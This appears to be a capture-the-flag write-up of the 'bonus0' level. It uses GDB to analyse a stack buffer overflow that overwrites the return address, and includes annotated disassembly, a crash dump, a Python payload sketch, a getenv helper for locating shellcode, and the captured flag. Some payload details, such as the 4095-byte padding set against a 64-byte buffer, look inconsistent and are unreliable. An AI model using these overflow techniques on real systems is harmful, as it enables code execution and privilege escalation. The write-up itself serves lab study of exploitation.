# GDB Analysis – bonus0 (Stack Overflow + Return Address Control)

This analysis covers the exploitation of a buffer overflow vulnerability in the `bonus0` binary using GDB. The goal is to understand how controlled overwrite of the stack enables execution redirection.

---

## Program Behavior Overview

The `bonus0` program:
1. Allocates a buffer on the stack
2. Calls function `pp` with a pointer to the buffer
3. Prints the buffer using `puts()`
4. Exits normally (unless memory corruption occurs)

---

## 1. Main Function Analysis

```asm
0x080485a4 <+0>:  push %ebp
                  ; Save previous stack frame

0x080485a5 <+1>:  mov %esp, %ebp
                  ; Create new stack frame

0x080485a7 <+3>:  and $0xfffffff0, %esp
                  ; Align stack to 16 bytes boundary

0x080485aa <+6>:  sub $0x40, %esp
                  ; Reserve 64 bytes local stack space

0x080485ad <+9>:  lea 0x16(%esp), %eax
                  ; Load address of buffer at esp+0x16

0x080485b1 <+13>: mov %eax, (%esp)
                  ; Pass buffer pointer as first argument

0x080485b4 <+16>: call pp
                  ; Call function pp (fills buffer)

0x080485b9 <+21>: lea 0x16(%esp), %eax
                  ; Reload same buffer address

0x080485bd <+25>: mov %eax, (%esp)
                  ; Prepare argument for puts

0x080485c0 <+28>: call puts
                  ; Print buffer content

0x080485c5 <+33>: mov $0x0, %eax
                  ; Set return value to 0

0x080485ca <+38>: leave
                  ; Restore stack frame

0x080485cb <+39>: ret
                  ; Return from main
```

---

## 2. Program Execution and Input

### First Input Line
Program prompts for initial input

### Second Input Line (Malicious)
```
7846213986666666666666421111111111111111111111111111111
```

This long string **overflows the internal buffer** and corrupts stack memory.

---

## 3. Crash Observation

### Segmentation Fault

```
Program received signal SIGSEGV (Segmentation Fault)
eip 0x36363636
```

**Meaning:**
- The instruction pointer (EIP) is overwritten with `0x36363636`
- `0x36363636` in hex = ASCII `6666` (repeated '6' characters)
- This confirms **buffer overflow overwrote the return address**

---

## 4. Register Analysis at Crash

| Register | Value | Meaning |
|----------|-------|---------|
| `eax` | 0x00000000 | No return value yet |
| `ecx` | 0xffffffff | Unused/leftover register |
| `edx` | 0xb7fd28b8 | System library pointer |
| `ebx` | 0xb7fd0ff4 | Base pointer to libc |
| `esp` | 0xbffff730 | Stack pointer (current location) |
| `ebp` | 0x38393331 | **CORRUPTED** with ASCII values |
| `eip` | 0x36363636 | **OVERWRITTEN** - Instruction pointer lost! |

> ⚠️ **The corrupted EIP value proves we have control over code execution!**

---

## 5. Stack Content Analysis

```
0xbffff730 contains:
36363636
36363636  (repeated pattern)
...
```

The stack shows a **controlled pattern of '6' characters**, confirming we can write specific values to the return address.

---

## 6. Stack Layout

```
High Address
+------------------+
| saved EBP        |  ← Can be overwritten
+------------------+
| return address   |  ← ⚠️ MAIN TARGET (overwritten with 0x36363636)
+------------------+
| local variables  |
+------------------+
| buffer (64B)     |  ← Overflow starts here
+------------------+
Low Address
```

---

## 7. Exploit Strategy

### Goal
Replace **EIP with a controlled address** to redirect execution flow.

### Attack Steps

1. **Overflow buffer** using long input string
2. **Overwrite saved EBP and return address**
3. **Redirect execution** to target address (shellcode, function, etc.)

### Payload Construction Example

**Python script:**
```python
import struct

addr = struct.pack('<I', 0xbffff8a6)  # Target address (little-endian)

payload = "A" * 4095           # Padding to reach overflow point
payload += "\n"                # Newline to trigger input
payload += "Aa0Aa1Aa2"         # Pattern to locate offset
payload += addr                # Target return address
payload += "B" * 10            # Additional padding
```

**Execution:**
```bash
(python script ; cat) | ./bonus0
```

This sends the exploit payload and keeps stdin open for additional interaction.

---

## 8. Helper Tool: getenv

### Purpose
Used to **find environment variable addresses** in memory, helping locate shellcode.

### Code

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
    printf("%p\n", getenv(argv[1]));
    return 0;
}
```

### Compilation

```bash
gcc getenv.c -o getenv
```

### Usage

```bash
./getenv SHELLCODE
```

**Output:** Memory address of the environment variable

---

## 9. Exploitation Process

### Overflow Pattern

```
Buffer (64 bytes) + EBP (4 bytes) + EIP (4 bytes) + excess
[A A A A] [controlled data] [target address]
```

### Crash with Controlled Value

By carefully crafting input:
- Fill 64-byte buffer
- Overwrite saved EBP (4 bytes)
- Overwrite return address with `0x36363636` (4 bytes)
- Continue with additional padding

### Crash Analysis

```
EIP = 0x36363636

This is the confirmation that:
✓ Buffer overflow successful
✓ Return address controlled
✓ Ready for final exploitation
```

---

## 10. Final Exploitation Result

### Command Execution

```bash
cat /home/user/bonus0/.pass
```

### Flag Obtained

```
cd2f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

---

## Vulnerability Analysis

### Buffer Overflow

The program uses **unsafe input handling** without bounds checking:
- Buffer allocated: **64 bytes**
- Input limit: **None** (or very high)
- Result: **Complete stack control**

### Return Address Control

By overflowing the buffer:
- Saved EBP can be overwritten
- **Return address can be completely controlled**
- Execution flow can be redirected to:
  - Shellcode
  - Existing functions (ROP gadgets)
  - System commands

### Exploitation Requirements

1. **Locate target address** (using getenv or manual calculation)
2. **Craft exploit payload** with correct offset
3. **Send payload** via program input
4. **Redirect execution** to controlled address
5. **Achieve arbitrary code execution**

---

## Summary

**Critical vulnerability:**

1. **Stack Buffer Overflow**
   - Input copied without bounds checking
   - Enables overwrite of entire stack frame

2. **Return Address Control**
   - Saved EIP can be completely overwritten
   - Proven by crash with `0x36363636` value

3. **Arbitrary Code Execution**
   - Return address redirects to attacker code
   - Enables command execution
   - Privilege escalation if running with elevated privileges

**Exploitation requires:**
- Understanding stack layout and function calls
- Calculating precise offset to return address
- Finding or crafting target address (shellcode location)
- Sending exploit payload via program input
